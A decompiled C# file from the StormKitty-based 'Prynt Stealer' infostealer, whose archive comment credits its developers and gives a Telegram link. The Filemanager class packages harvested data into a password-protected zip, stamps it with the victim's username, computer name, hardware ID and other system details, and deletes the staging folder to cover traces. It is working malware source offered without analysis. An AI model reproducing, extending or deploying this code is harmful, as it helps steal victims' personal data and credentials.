using System;
using System.IO;
using System.Linq;
using System.Text;
using Ionic.Zip;
using Ionic.Zlib;

namespace StormKitty
{
	// Token: 0x0200004B RID: 75
	internal sealed class Filemanager
	{
		// Token: 0x06000138 RID: 312 RVA: 0x00009E78 File Offset: 0x00008078
		public static void RecursiveDelete(string path)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			if (!directoryInfo.Exists)
			{
				return;
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			for (int i = 0; i < directories.Length; i++)
			{
				Filemanager.RecursiveDelete(directories[i].FullName);
			}
			directoryInfo.Delete(true);
		}

		// Token: 0x06000139 RID: 313 RVA: 0x00009EC0 File Offset: 0x000080C0
		public static void CopyDirectory(string sourceFolder, string destFolder)
		{
			if (!Directory.Exists(destFolder))
			{
				Directory.CreateDirectory(destFolder);
			}
			foreach (string text in Directory.GetFiles(sourceFolder))
			{
				string fileName = Path.GetFileName(text);
				string destFileName = Path.Combine(destFolder, fileName);
				File.Copy(text, destFileName);
			}
			foreach (string text2 in Directory.GetDirectories(sourceFolder))
			{
				string fileName2 = Path.GetFileName(text2);
				string destFolder2 = Path.Combine(destFolder, fileName2);
				Filemanager.CopyDirectory(text2, destFolder2);
			}
		}

		// Token: 0x0600013A RID: 314 RVA: 0x00009F3C File Offset: 0x0000813C
		public static long DirectorySize(string path)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			return directoryInfo.GetFiles().Sum((FileInfo fi) => fi.Length) + directoryInfo.GetDirectories().Sum((DirectoryInfo di) => Filemanager.DirectorySize(di.FullName));
		}

		// Token: 0x0600013B RID: 315 RVA: 0x00009FA8 File Offset: 0x000081A8
		public static string CreateArchive(string directory, bool setpassword = true)
		{
			if (Directory.Exists(directory))
			{
				using (ZipFile zipFile = new ZipFile(Encoding.Default))
				{
					zipFile.CompressionLevel = CompressionLevel.BestCompression;
					zipFile.Comment = string.Concat(new string[]
					{
						"\nPrynt Stealer Developed By @FlatLineStealerUpdated And @youhacker55\nhttp://t.me/officialpryntsoftware\n\n== System Info ==\nDate: ",
						SystemInfo.datenow,
						"\nUsername: ",
						SystemInfo.username,
						"\nCompName: ",
						SystemInfo.compname,
						"\nLanguage: ",
						SystemInfo.culture,
						"\n\n== Hardware ==\nCPU: ",
						SystemInfo.GetCPUName(),
						"\nGPU: ",
						SystemInfo.GetGPUName(),
						"\nRAM: ",
						SystemInfo.GetRamAmount(),
						"\nHWID: ",
						SystemInfo.GetHardwareID(),
						"\nPower: ",
						SystemInfo.GetBattery(),
						"\nScreen: ",
						SystemInfo.ScreenMetrics(),
						"\n"
					});
					if (setpassword)
					{
						zipFile.Password = Config.password;
					}
					zipFile.AddDirectory(directory);
					zipFile.Save(directory + ".zip");
				}
			}
			Filemanager.RecursiveDelete(directory);
			Console.WriteLine("Archive " + new DirectoryInfo(directory).Name + " compression completed");
			return directory + ".zip";
		}
	}
}
